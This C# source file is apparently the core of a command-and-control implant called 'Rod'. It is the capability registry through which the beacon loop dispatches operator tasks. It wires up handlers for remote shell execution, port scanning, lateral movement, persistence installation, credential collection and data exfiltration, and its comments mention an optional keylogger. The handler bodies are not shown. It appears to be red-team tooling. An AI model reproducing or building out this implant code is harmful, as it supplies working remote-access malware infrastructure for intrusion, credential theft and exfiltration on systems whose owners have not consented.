using Rod.V1;

namespace Rod.Implant.Internal;

// The implant-side capability registry (architecture.md Sec 5.3): the implant
// analog of the server's ICapabilityModule and capability registry. Every verb
// the reference implant can run is one compiled handler registered here, and
// the registry is the only dispatch path -- the beacon loop calls Dispatch
// directly, there is no hard-coded switch in the runner. The handshake
// capability set derives from this registry too: the advertised verbs are the
// baked class verb set intersected with the compiled handlers, so the implant
// never advertises a verb it cannot run (and never ships one outside its
// class's build-time permit set).
//
// Registration is compile-time by design: no runtime assembly loading (that
// would break Native AOT, enlarge the artifact, and introduce on-disk plugin
// files), and the capability set is decided per class at build time, so
// runtime discovery buys nothing. Adding a verb is a handler plus one
// registration in Default -- never an edit to the beacon loop. Out-of-tree
// handlers for contract-only verbs (e.g. collect.keylog) compile into a
// separate per-engagement artifact by adding their registrations alongside the
// reference set; the reference registry carries no Sec 13 boundary verb.

/// <summary>
/// What one handler invocation produced: the wire outcome, the captured output,
/// and any out-of-band exfil chunks. Implicitly constructible from the bare
/// (outcome, output) pair most handlers return, so a handler keeps its
/// two-value shape and only the chunk-producing verbs mention the channel.
/// </summary>
internal readonly record struct HandlerResult(
    TaskOutcome Outcome,
    string Output,
    IReadOnlyList<ExfilChunk> Chunks)
{
    public static implicit operator HandlerResult((TaskOutcome Outcome, string Output) result)
        => new(result.Outcome, result.Output, Array.Empty<ExfilChunk>());

    public static implicit operator HandlerResult((TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) result)
        => new(result.Outcome, result.Output, result.Chunks);
}

/// <summary>
/// One compiled handler for a single capability verb, the implant analog of the
/// server's ICapabilityModule (architecture.md Sec 5.3). Handlers are stateless
/// apart from their construction-time dependencies (the lateral.move handler
/// captures the enroll bundle), so the registry may invoke them concurrently.
/// </summary>
internal interface ICapabilityHandler
{
    /// <summary>The verb this handler runs, e.g. "shell.exec".</summary>
    string Verb { get; }

    /// <summary>Runs the handler against <paramref name="arguments"/>.</summary>
    HandlerResult Handle(string arguments);
}

/// <summary>
/// A handler that delegates to a function, so the per-verb static methods in
/// <see cref="Core"/>, <see cref="Lateral"/>, <see cref="Persist"/>,
/// <see cref="Collect"/>, and <see cref="Exfil"/> register as handlers without
/// each wrapping itself in a class.
/// </summary>
internal sealed class CapabilityHandler : ICapabilityHandler
{
    private readonly Func<string, HandlerResult> _handle;

    public string Verb { get; }

    public CapabilityHandler(string verb, Func<string, HandlerResult> handle)
    {
        Verb = verb;
        _handle = handle;
    }

    public HandlerResult Handle(string arguments) => _handle(arguments);
}

/// <summary>
/// The compile-time handler registry the beacon dispatches through and derives
/// its advertised capability set from (architecture.md Sec 5.3). Verbs are
/// matched case-insensitively; a duplicate registration replaces the earlier
/// handler (last-registration-wins, the same rule as the server's capability
/// registry) while keeping the verb's place in the advertised order.
/// </summary>
internal sealed class HandlerRegistry
{
    // Verb (case-insensitive) -> the handler that runs it.
    private readonly Dictionary<string, ICapabilityHandler> _byVerb;

    // The registered verbs in registration order, deduplicated. This is the
    // compiled handler set the advertised capability set derives from.
    private readonly IReadOnlyList<string> _verbs;

    private HandlerRegistry(IReadOnlyList<ICapabilityHandler> handlers)
    {
        var byVerb = new Dictionary<string, ICapabilityHandler>(handlers.Count, StringComparer.OrdinalIgnoreCase);
        var verbs = new List<string>(handlers.Count);
        foreach (var handler in handlers)
        {
            if (!byVerb.TryAdd(handler.Verb, handler))
            {
                // Last registration wins; drop the earlier entry so the verb
                // appears once, in the position of its latest registration.
                byVerb[handler.Verb] = handler;
                var prior = verbs.FindIndex(v => string.Equals(v, handler.Verb, StringComparison.OrdinalIgnoreCase));
                if (prior >= 0)
                    verbs.RemoveAt(prior);
            }
            verbs.Add(handler.Verb);
        }
        _byVerb = byVerb;
        _verbs = verbs;
    }

    /// <summary>
    /// Builds the reference registry: one compiled handler per standard
    /// category verb the reference implant implements -- the core baseline
    /// (shell, file push/pull) plus the recon, lateral, persist, collect, and
    /// exfil sets (architecture.md Sec 10.1) -- the lateral.move handler
    /// carrying the <paramref name="enroll"/> bundle when child derivation is
    /// enabled. <paramref name="additional"/> carries extra compile-time
    /// registrations (an out-of-tree handler, or a test's stand-in), appended
    /// after the reference set.
    /// </summary>
    public static HandlerRegistry Default(EnrollBundle? enroll = null, IEnumerable<ICapabilityHandler>? additional = null)
    {
        var handlers = new List<ICapabilityHandler>
        {
            new CapabilityHandler("shell.exec", args => Core.ShellExec(args)),
            new CapabilityHandler("file.push", args => Files.Push(args)),
            new CapabilityHandler("file.pull", args => Files.Pull(args)),
            new CapabilityHandler("recon.portscan", args => Core.PortScan(args)),
            new CapabilityHandler("recon.hostenum", args => Core.HostEnum(args)),
            new CapabilityHandler("recon.service", args => Core.ServiceProbe(args)),
            new CapabilityHandler("lateral.move", args => Lateral.Move(args, enroll)),
            new CapabilityHandler("lateral.token", args => Lateral.Token(args)),
            new CapabilityHandler("lateral.exec_remote", args => Lateral.ExecRemote(args)),
            new CapabilityHandler("persist.install", args => Persist.Install(args)),
            new CapabilityHandler("persist.remove", args => Persist.Remove(args)),
            new CapabilityHandler("persist.list", args => Persist.List(args)),
            new CapabilityHandler("collect.cred", args => Collect.Cred(args)),
            new CapabilityHandler("exfil.push", args => Exfil.Push(args)),
            new CapabilityHandler("exfil.stage", args => Exfil.Stage(args)),
        };
        if (additional is not null)
            handlers.AddRange(additional);
        return new HandlerRegistry(handlers);
    }

    /// <summary>
    /// The compiled handler set, in registration order -- the verbs this binary
    /// can actually run.
    /// </summary>
    public IReadOnlyList<string> Verbs => _verbs;

    /// <summary>
    /// The capability set to advertise at handshake: the baked class verbs
    /// intersected with the compiled handlers, in registry order
    /// (architecture.md Sec 5.3). An empty <paramref name="bakedClassVerbs"/>
    /// means the binary was not baked with a class (the checked-in dev stub,
    /// driven by flags/env), so it advertises its full compiled set -- still
    /// exactly the verbs it can run, never one it cannot.
    /// </summary>
    public IReadOnlyList<string> AdvertisedVerbs(IReadOnlyList<string> bakedClassVerbs)
    {
        if (bakedClassVerbs.Count == 0)
            return _verbs;

        var permitted = new HashSet<string>(bakedClassVerbs.Count, StringComparer.OrdinalIgnoreCase);
        foreach (var verb in bakedClassVerbs)
            permitted.Add(verb);

        var advertised = new List<string>();
        foreach (var verb in _verbs)
        {
            if (permitted.Contains(verb))
                advertised.Add(verb);
        }
        return advertised;
    }

    /// <summary>
    /// Routes <paramref name="verb"/> to its registered handler and returns the
    /// wire outcome, captured output, and any out-of-band exfil chunks. An
    /// unregistered verb reports Failed with a clear message rather than
    /// throwing, so the operator sees the cause.
    /// </summary>
    public (TaskOutcome Outcome, string Output, IReadOnlyList<ExfilChunk> Chunks) Dispatch(
        string verb, string arguments)
    {
        if (_byVerb.TryGetValue(verb, out var handler))
        {
            var result = handler.Handle(arguments);
            return (result.Outcome, result.Output, result.Chunks);
        }
        return (TaskOutcome.Failed, "unknown verb: " + verb, Array.Empty<ExfilChunk>());
    }
}
